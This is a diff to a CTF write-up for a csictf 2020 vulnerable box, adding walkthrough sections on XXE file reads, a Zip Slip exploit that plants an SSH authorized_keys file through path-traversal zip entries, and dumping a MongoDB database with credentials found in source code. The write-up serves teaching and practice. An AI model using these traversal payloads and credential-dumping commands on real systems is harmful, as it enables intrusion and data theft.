@@ -7,6 +7,8 @@ This challenge is a HackTheBox like box,  so we are given an ip address to scan 
 - initial enumeration 
 - No Sql injection 
 - XXE in /admin
+- Zip Slip in /home
+- Server enumeration
 
 ### Initial enumeration
 
@@ -32,7 +34,7 @@ Annnddd we got redirection so nosqlinjection did work and this website is vulner
 
 let's just check the /admin page first we got a zip extractor and by checking the source code we found the flag for **Htbx02** and here is it `csictf{n0t_4ll_1nj3ct10n5_4re_SQLi}` 
 
-<img src="/home/akram09/Desktop/CTF-Writeups/csictf2020/linux/Htb/src/admin_source.png" alt="flag for htb2" style="zoom:67%;" />
+<img src="src/admin_source.png" alt="flag for htb2" style="zoom:67%;" />
 
  ### XXE in /admin 
 
@@ -42,6 +44,73 @@ by trying different payloads for each type we knew that only the json and xml we
 
 <img src="src/xxe_inj.png" alt="xxe injection " style="zoom:50%;" />  
 
-So in response we got the regular `/etc/passwd` we can notice the users `csictf`, `administrator` and ... wait a minute what is that !! we found a link in the /etc/passwd to a [github gist](https://gist.github.com/sivel/c68f601137ef9063efd7)  , after reading that gist we understand it is about structuring the ssh keys for better ssh keys management , so basically for this key management to work we have to create a bash script at `/usr/local/bin/` and add our configuration to it , than we need to modify the ssh configuration to point to this bash script , so as an attacker we need to get ssh keys so we tried to read the ssh configuration with xxe `/etc/ssh/sshd_config` after a deep look into the file we saw a flag and it was for **HTBX05** `csictf{cu5t0m_4uth0rizat10n}`
+So in response we got the regular `/etc/passwd` we can notice the users `csictf`, `administrator` and ... wait a minute what is that !! we found a link in the /etc/passwd to a [github gist](https://gist.github.com/sivel/c68f601137ef9063efd7)  , after reading that gist we understand it is about structuring the ssh keys for better ssh keys management , so basically for this key management to work we have to create a bash script at `/usr/local/bin/` and add our configuration to it , than we need to modify the ssh configuration to point to this bash script , so as an attacker we need to get ssh keys so we tried to read the ssh configuration with xxe `/etc/ssh/sshd_config` after a deep look into the file we saw a flag and it was for **HTBX05** `csictf{cu5t0m_4uth0rizat10n}` and after reading the`/user/local/bin/userkeys` we knew that ssh keys must be put in `/home/administrator/uploads/keys/`
 
-<img src="/home/akram09/Desktop/CTF-Writeups/csictf2020/linux/Htb/src/xxe_sshd.png" alt="sshd_config" style="zoom:50%;" />
+<img src="src/xxe_sshd.png" alt="sshd_config" style="zoom:50%;" />
+
+### Zip Slip in /home
+
+after getting that flag we though we are done with the xxe attack and we must have a reverse shell or ssh keys so we tried read ssh keys from different folders but we found anything so we decided to go back to the `/home` page and scan if it has some vulnerability , so we tried to upload dummy zip it said that `zip too large` so we just put a txt dummy file in it and it returned `{success:true}` that's all , we tried to access the file we uploaded trying different routes like /file.txt , /uploads/file.txt ... but didn't found anything after a search about zip upload vulnerabilities we found a vulnerability called **ZIP SLIP** which exploit zip extraction and allow us to override files when extracting the zip .(some of the great resources to read about it are [LiveOverflow video](https://www.youtube.com/watch?v=Ry_yb5Oipq0) or [Official website](https://snyk.io/research/zip-slip-vulnerability) ), now let's create our zip exploit as this (Notice use `/home/administrator/uploads/keys/` as location to ssh public key ) 
+
+first create the `administrator/uploads/keys` and put ssh keys in it  :
+
+```bash
+sudo mkdir -p administrator/uploads/keys
+cd administrator/uploads/keys
+sudo ssh-keygen 
+# pass /home/administrator/uploads/keys/id_rsa  as path
+```
+
+then create our zip (NOTICE we must rename id_rsa.pub to `authorized_keys` because that's what the ssh server accept):
+
+```bash
+sudo mv id_rsa.pub authorized_keys
+sudo zip exploit.zip ../../../../../../../../../../../home/administrator/uploads/keys/authorized_keys
+```
+
+we added multiple `..` because we don't know the exact path the zip will be extracted after uploading it we got `{"success":true}` let's try to connect via ssh private key 
+
+```bash
+sudo ssh -i id_rsa csictf@34.93.215.188
+```
+
+we got a shell :tada: :tada: , doing an `ls ` we dound `flag.txt` and by reading it we got a flag `csictf{w3lc0m3_t0_th3_s3rv3r}` for **HTBx03**
+
+### Server enumeration
+
+let's start by enumerating the /home/csictf folder 
+
+```bash
+csictf@instance-3:~$ ls -la
+total 24
+drwxr-xr-x 2 root root 4096 Jul 20 13:12 .
+drwxr-xr-x 9 root root 4096 Jul 20 12:46 ..
+-rw-r--r-- 1 root root  220 Jul 20 12:40 .bash_logout
+-rw-r--r-- 1 root root 3771 Jul 20 12:40 .bashrc
+-rw-r--r-- 1 root root  807 Jul 20 12:40 .profile
+-rw-r--r-- 1 root root   30 Jul 20 13:12 flag.txt
+```
+
+nothing very useful here we checked the `/home` for other home directory all were empty except for the `administrator` we found two folders `uploads` where the zip where puts and `website` that contains the code for the web app , after listing and viewing different folders and files we saw a file in `website/models/db.js` that contain a flag : 
+
+```js
+csictf@instance-3:/home/administrator/website/models$ cat db.js
+const mongoose = require('mongoose');
+
+mongoose.Promise = global.Promise;
+
+// csictf{exp0s3d_sec23ts}
+mongoose.connect('mongodb://web:9EAC744765EA6F26@34.93.215.188:27017/HTBDB', {
+    useNewUrlParser: true,
+    useCreateIndex: true,
+    useUnifiedTopology: true,
+})
+```
+
+so the flag `csictf{exp0s3d_sec23ts}` is for the challenge **HTBx06**  and we have a url for connecting to mongodb with the creds in it so we tried to dump the db with `mongodump`
+
+```bash
+mongodump --uri='mongodb://web:9EAC744765EA6F26@34.93.215.188:27017/HTBDB'
+```
+
+ and we got a list of mongodb collection . after scanning the result we found the last flag for **HTBx04** in the collection stuff here is the flag `csictf{m0ng0_c0llect10ns_yay}` and that conclude this series of challenge .
